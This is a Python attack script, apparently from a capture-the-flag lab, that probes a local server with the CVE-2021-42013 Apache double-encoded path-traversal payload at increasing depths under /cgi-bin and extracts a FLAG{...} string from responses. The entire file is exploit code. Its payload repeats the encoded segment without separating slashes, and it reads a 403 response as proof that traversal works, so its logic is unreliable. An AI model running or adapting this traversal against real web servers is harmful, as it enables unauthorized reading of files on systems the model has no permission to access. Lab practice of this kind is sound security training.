import requests
import re

target = "http://127.0.0.1:33094"
print("Starting CVE-2021-42013 test\n")
found_flag = False

for depth in range(1, 6):
    url = f"{target}/cgi-bin{'.%%32%65' * depth}/flag"
    try:
        resp = requests.get(url, timeout=5)
        print(f"Depth {depth}: {url}")
        print(f"  Status: {resp.status_code}")
        print(f"  Server: {resp.headers.get('Server', 'N/A')}")
        print(f"  Size: {len(resp.text)} bytes")
        
        if resp.status_code == 200:
            flag = re.search(r'FLAG\{[^}]+\}', resp.text)
            if flag:
                print(f"[!] FLAG: {flag.group(0)}")
                found_flag = True
            else:
                print(f"  Response: {resp.text[:200]}")
        elif resp.status_code == 403:
            print(f"  [i] Permission denied - traversal working")
        elif resp.status_code == 404:
            print(f"  [i] Not found")
        print()
        
    except Exception as e:
        print(f"Depth {depth} error: {e}\n")

if found_flag:
    print("[SUCCESS] Flag found!")
else:
    print("[DONE] No flag found in depths 1-5")

print("\nTesting depths 6-10...")
for depth in range(6, 11):
    url = f"{target}/cgi-bin{'.%%32%65' * depth}/flag"
    try:
        resp = requests.get(url, timeout=5)
        print(f"Depth {depth}: Status {resp.status_code}, Size {len(resp.text)}")
        if resp.status_code == 200:
            flag = re.search(r'FLAG\{[^}]+\}', resp.text)
            if flag:
                print(f"[!] FLAG: {flag.group(0)}")
                found_flag = True
    except Exception as e:
        print(f"Depth {depth} error: {e}")

print(f"\nFinal: Flag found = {found_flag}")
